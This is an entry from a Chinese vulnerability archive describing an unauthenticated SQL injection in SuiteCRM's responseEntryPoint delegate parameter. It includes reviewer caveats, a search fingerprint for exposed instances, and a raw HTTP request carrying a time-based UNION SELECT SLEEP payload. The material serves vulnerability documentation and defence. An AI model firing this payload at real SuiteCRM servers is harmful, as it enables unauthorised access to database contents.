---
source: "wy876 漏洞文库"
title: "SuiteCRM responseEntryPoint delegate SQL注入"
product: "SuiteCRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；MySQL语法假设"
prerequisites: "匿名声称，请求无Cookie"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/scs5n834l406n097"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/SuiteCRM/SuiteCRMresponseEntryPoint%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-5411ebde8cc286dec29b5f22"
entity_id: "ve-5411ebde8cc286dec29b5f22"
schema_version: "1"
---

# SuiteCRM responseEntryPoint delegate SQL注入

## 条目说明

- 对象与具体问题：SuiteCRM；responseEntryPoint delegate SQL注入
- 版本、配置及部署条件：版本未知；MySQL语法假设
- 认证与权限前提：匿名声称，请求无Cookie
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有延时请求无计时对照或响应，需证明delegate实际进入查询
- response=accept可能改变邀请响应等业务状态，补副作用说明
- 原样特殊字符需规范编码，Host空；缺CVE/修复/源码来源

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
SuiteCRM存在SQL注入漏洞，未经身份验证的远程攻击者可以通过该漏洞拼接执行SQL注入语句，从而获取数据库敏感信息。

## 二、影响版本
+ SuiteCRM

## 三、资产测绘
```plain
title="SuiteCRM"
```


## 四、漏洞复现
```http
GET /index.php?entryPoint=responseEntryPoint&event=1&delegate=a<"+UNION+SELECT+SLEEP(5);--+-&type=c&response=accept HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/scs5n834l406n097>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
